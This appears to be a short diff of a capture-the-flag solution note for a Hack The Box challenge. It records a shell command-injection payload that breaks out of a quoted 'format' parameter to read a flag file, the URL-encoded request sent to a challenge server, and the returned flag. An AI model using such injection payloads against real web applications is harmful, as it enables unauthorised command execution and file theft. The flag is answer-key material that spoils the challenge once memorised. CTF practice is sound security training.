@@ -1,0 +1,4 @@
+'; echo $(cat ../flag) '
+
+$ http://94.237.55.185:45222/?format=%27;%20echo%20$(cat%20../flag)%20%27
+>It's HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}.
